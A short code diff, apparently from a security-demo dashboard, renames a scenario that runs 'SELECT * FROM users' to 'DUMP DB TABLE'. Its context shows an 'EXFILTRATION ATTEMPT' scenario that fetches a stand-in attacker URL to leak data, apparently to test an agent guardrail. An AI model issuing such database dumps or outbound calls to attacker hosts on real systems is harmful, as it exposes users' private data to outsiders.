@@ -200,7 +200,7 @@ with col_main:
         "SELECT OPERATIONAL CONTEXT:",
         [
             "WITHOUT LILITH",
-            "PROTECTED_RLS_CONTAINMENT",
+            "DUMP DB TABLE",
             "EXFILTRATION ATTEMPT",
             "AUTHORIZED QUERY"
         ],
@@ -292,7 +292,7 @@ with col_main:
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
             
-            if scenario == "PROTECTED_RLS_CONTAINMENT":
+            if scenario == "DUMP DB TABLE":
                 loop.run_until_complete(run_op("execute_sql", {"query": "SELECT * FROM users"}))
             elif scenario == "EXFILTRATION ATTEMPT":
                 loop.run_until_complete(run_op("fetch_url", {"url": "http://attacker-controlled.xyz/leak"}))
